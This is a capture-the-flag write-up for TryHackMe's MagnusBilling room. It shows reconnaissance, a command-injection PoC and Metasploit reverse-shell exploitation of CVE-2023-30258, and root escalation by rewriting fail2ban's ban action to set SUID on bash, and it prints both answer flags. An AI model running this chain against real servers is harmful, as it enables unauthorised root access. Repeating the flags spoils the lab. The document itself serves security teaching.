---
title: "MBilling - Web Exploitation Writeup"
description: CVE-2023-30258 unauthenticated OS command injection leading to RCE and root privilege escalation on MagnusBilling
tags: [CTF, web, TryHackMe, RCE, privilege-escalation]
author: KKhao
date: 2026-09-24
---

# MBilling — Web Exploitation Writeup

## Table of Contents
- [Challenge Scenario](#challenge-scenario)
- [Reconnaissance](#reconnaissance)
- [Exploitation Chain](#exploitation-chain)
  - [MySQL](#mysql)
  - [Asterisk](#asterisk)
  - [MagnusBilling](#magnusbilling)
- [CVE-2023-30258 — Unauthenticated RCE](#cve-2023-30258--unauthenticated-rce)
- [Privilege Escalation — fail2ban-client](#privilege-escalation--fail2ban-client)
- [Flags](#flags)

> **Note:** The target IP changes across sections (`10.49.164.169`, `10.49.172.241`, `10.49.163.35`) due to instance resets during the lab session. Replace with your own assigned IP when reproducing.

---

## Challenge Scenario

The objective is to retrieve flags via shell access. Given the challenge is tagged as web exploitation, the likely attack surface is either a misconfigured service or a known CVE in the deployed software version.

## Reconnaissance

Starting with a full port scan:

```bash
nmap -sC -sV -T4 -p- 10.49.172.241
```

<details>
<summary>Flag reference</summary>

- `-sC`: run default NSE scripts
- `-sV`: service/version detection
- `-T4`: aggressive timing template
- `-p-`: scan all 65535 ports

</details>

**Output:**

```
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)
80/tcp   open  http     Apache httpd 2.4.62 ((Debian))
| http-title:             MagnusBilling        
|_Requested resource was http://10.49.172.241/mbilling/
| http-robots.txt: 1 disallowed entry 
|_/mbilling/
3306/tcp open  mysql    MariaDB 10.3.23 or earlier (unauthorized)
5038/tcp open  asterisk Asterisk Call Manager 2.10.6
```

**Attack surface triage:**

| Port | Service | Notes |
|------|---------|-------|
| 22 | SSH | Useful once valid credentials are obtained |
| 80 | HTTP (MagnusBilling) | `robots.txt` discloses `/mbilling/` — primary target |
| 3306 | MySQL/MariaDB | Potential credential source if accessible |
| 5038 | Asterisk Call Manager | Requires AMI credentials to be useful |

---

## Exploitation Chain

### MySQL

Tested for anonymous/blank-credential access, a common misconfiguration:

```bash
mysql -h 10.49.164.169 -u root -p
mysql -h 10.49.164.169 -u root          # no password
mysql -h 10.49.164.169 -u anonymous -p
mysql -h 10.49.164.169 -u '' -p         # blank user = MySQL anonymous account
```

All attempts were refused — the database only accepts connections from `localhost`, blocking external (`tun0`) access. MySQL and, by extension, direct SSH via leaked credentials were ruled out.

### Asterisk

Asterisk AMI has a known authenticated RCE (`Asterisk AMI Originate Authenticated RCE`), but exploitation requires valid AMI credentials to log into the socket first:

```bash
telnet 10.49.164.169 5038
```

No credentials were available for this service, so it was deprioritized.

### MagnusBilling

Directory enumeration against `/mbilling/`:

```bash
gobuster dir -u http://10.49.164.169/mbilling/ -w <wordlist>
```

```
archive              (Status: 301) [Size: 325] [--> http://10.49.164.169/mbilling/archive/]
resources            (Status: 301) [Size: 327] [--> http://10.49.164.169/mbilling/resources/]
assets               (Status: 301) [Size: 324] [--> http://10.49.164.169/mbilling/assets/]
lib                  (Status: 301) [Size: 321] [--> http://10.49.164.169/mbilling/lib/]
tmp                  (Status: 301) [Size: 321] [--> http://10.49.164.169/mbilling/tmp/]
protected            (Status: 403) [Size: 278]
```

A build-info JSON file exposed the exact application version:

```json
{
  "name": "MBilling",
  "version": "6.0.0.0",
  "framework": "ext",
  "toolkit": "classic",
  "theme": "black-neptune"
}
```


---


## CVE-2023-30258 — Unauthenticated RCE

**Description**

A command injection vulnerability exists in MagnusBilling 6.x/7.x via `lib/icepay/icepay.php`. The file calls `exec()` on the user-controlled `democ` GET parameter without sanitization, allowing an unauthenticated attacker to execute arbitrary OS commands with the privileges of the web server process (`www-data` or `asterisk`).


```php

exec($_GET['democ']);
```

**Blind command injection PoC**


```
GET /mbilling/lib/icepay/icepay.php?democ=;sleep+10; HTTP/1.1
```

The response was delayed by ~10 seconds, confirming blind OS command injection.

**Exploitation via Metasploit**


```
msf > search magnusbilling

Matching Modules
================
   #  Name                                                        Rank       Check
   -  ----                                                        ----       -----
   0  exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258  excellent  Yes
```

```
msf exploit(linux/http/magnusbilling_unauth_rce_cve_2023_30258) > set RHOSTS 10.49.163.35
msf exploit(linux/http/magnusbilling_unauth_rce_cve_2023_30258) > set LHOST 192.168.254.100
msf exploit(linux/http/magnusbilling_unauth_rce_cve_2023_30258) > run
```

Stabilizing the shell:

```bash
meterpreter > shell
script -qc /bin/bash /dev/null
```

**User flag:**

```bash
asterisk@ip-10-49-163-35:$ find / -iname 'user.txt' -type f 2>/dev/null
/home/magnus/user.txt
asterisk@ip-10-49-163-35:$ cat /home/magnus/user.txt
THM{4a6831d5f124b25eefb1e92e0f0da4ca}
```

---

## Privilege Escalation — fail2ban-client

Checking sudo permissions:

```bash
sudo -l
```

```
User asterisk may run the following commands on ip-10-49-163-35:
    (ALL) NOPASSWD: /usr/bin/fail2ban-client
```

`fail2ban-client` can be run as root with no password. `fail2ban-server` itself runs as root, so any action executed through its `actionban` configuration is also executed with root privileges when triggered — this is the root cause exploited below.

**1. Enumerate active jails**

```bash
sudo /usr/bin/fail2ban-client status
```

```
Jail list: ast-cli-attck, ast-hgc-200, asterisk-iptables, asterisk-manager,
           ip-blacklist, mbilling_ddos, mbilling_login, sshd
```

**2. Check the `sshd` jail's ban action**

```bash
sudo /usr/bin/fail2ban-client status sshd
sudo /usr/bin/fail2ban-client get sshd actions
```

```
The jail sshd has the following actions:
iptables-multiport
```

**3. Overwrite `actionban` with a malicious payload**

```bash
sudo /usr/bin/fail2ban-client set sshd action iptables-multiport actionban "chmod +s /bin/bash"
sudo /usr/bin/fail2ban-client set sshd banip 8.8.8.8
```

Since `fail2ban-server` runs as root, banning an IP triggers the (now overwritten) `actionban` command as root — setting the SUID bit on `/bin/bash`. This is functionally a GTFOBins-style abuse of `fail2ban-client`.

**4. Drop into a root shell**

```bash
/bin/bash -p

```

```
bash-5.2# whoami
root
bash-5.2# id
uid=1001(asterisk) gid=1001(asterisk) euid=0(root) egid=0(root) groups=0(root),1001(asterisk)
bash-5.2# find / -iname 'root.txt' -type f 2>/dev/null

/root/root.txt

bash-5.2# cat /root/root.txt
THM{33ad5b530e71a172648f424ec23fae60}
```


---


## Flags

| Flag | Value |
|------|-------|

| User | `THM{4a6831d5f124b25eefb1e92e0f0da4ca}` |
| Root | `THM{33ad5b530e71a172648f424ec23fae60}` |

---

**Author:** [@KKhao](https://github.com/KKhao)
**Platform:** TryHackMe — MagnusBilling
